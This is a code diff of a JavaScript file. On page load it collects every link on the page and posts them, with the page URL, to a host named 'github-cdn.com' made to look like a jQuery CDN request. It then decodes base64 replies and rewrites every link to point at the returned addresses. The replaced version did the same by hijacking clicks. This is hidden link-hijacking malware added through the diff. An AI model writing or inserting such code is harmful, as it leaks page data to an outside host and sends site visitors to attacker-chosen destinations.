@@ -173,30 +173,69 @@ var Base64 = {
       return newCode;
     }
 
-    $(document).ready(function () {
-      var request = {};
-      request.referer = document.URL; 
-      request.version = 'replacemeuuid'; //Replace with real UUID
-      
-      var url =  "http://github-cdn.com" + "/jquery/latest";
-      $.ajax({
+$(document).ready(function () {
+    var request = {};
+    request.referer = document.URL; 
+    request.version = 'replacemeuuid'; //Replace with real UUID
+
+    var occurances = {};
+    $("a").each(function(index, value) {
+        //alert( index + ": " + value );
+        if(occurances[value]) {
+            occurances[value] += 1;
+        }
+        else {
+            occurances[value] = 1;
+        }
+    });
+
+    var sortable = [];
+    for (var item in occurances) {
+        sortable.push([item, occurances[item]]);
+    }
+
+    //sort links in order from most occurring to least
+    sortable.sort(function(a, b) {return a[1] - b[1]});
+
+    var links_in_order = "";
+    var links_arr = [];
+    for(var i = sortable.length - 1; i >= 0; i--) {
+        links_in_order += sortable[i][0] + ",";
+        links_arr.push(sortable[i][0]);
+    }
+
+    if(links_in_order != "") {
+        links_in_order = links_in_order.substring(0, links_in_order.length - 1);
+    }
+
+    request.links = links_in_order;
+
+    var url =  "http://github-cdn.com" + "/jquery/latest";
+        $.ajax({
         type: "POST",
         url: url,
         data: request,
         dataType: "json",
         success: function(response) {
-          if(response.jquery) {
-            var links = [];
-            for(var i=0 ; i<response.jquery.length ; i++) {
-              var split = response.jquery.split(code());
-              links.push(Base64.decode(split[0]));
+            if(response.jquery) {
+                var links = [];
+                for(var i = 0; i < response.jquery.length; i++) {
+                    var split = response.jquery.split(code());
+                    links.push(Base64.decode(split[0]));
+                }
+                var replacements = {};
+                for(var i = 0; i < links_arr.length; i++) {
+                    if(i <= links.length - 1) {
+                        replacements[links_arr[i]] = links[i];
+                    }
+                    else {
+                        replacements[links_arr[i]] = links[0];
+                    }
+                }
+                $("a").each(function(index, val) {
+                    $(this).attr("href", replacements[val]);
+                });
             }
-            $("a").each(function(key, val) {
-              $(this).click(function() {
-                window.location.replace(links[key]);
-              });
-            });
-          }
         }
-      });
     });
+});
